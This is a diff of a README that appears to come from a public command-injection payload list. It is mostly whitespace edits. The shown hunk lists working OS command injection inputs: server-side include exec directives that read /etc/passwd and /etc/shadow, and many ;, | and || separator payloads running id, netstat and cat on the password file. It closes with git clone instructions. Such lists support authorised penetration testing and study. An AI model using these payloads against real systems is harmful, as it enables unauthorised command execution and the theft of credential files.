@@ -52,21 +52,37 @@ and redirection. For example, the Java API Runtime.exec and the ASP.NET API Proc
 shell metacharacters. This defense can mitigate
 # Unix :
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt
+;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+
 /index.html|id|
+
 ;id;
+
 ;id
+
 ;netstat -a;
+
 ;system('cat%20/etc/passwd')
+
 ;id;
+
 |id
+
 |/usr/bin/id
+
 |id|
+
 |/usr/bin/id|
+
 ||/usr/bin/id|
+
 |id;
+
 ||/usr/bin/id;
 ;id|
 ;|/usr/bin/id|
@@ -589,5 +605,5 @@ Portswigger Web Security - OS Command Injection
 Cloning an Existing Repository ( Clone with HTTPS )
 # root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/command-injection-payload-list.git
 # Cloning an Existing Repository ( Clone with SSH )
-# root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/command-injection-payload-list.git
+
 
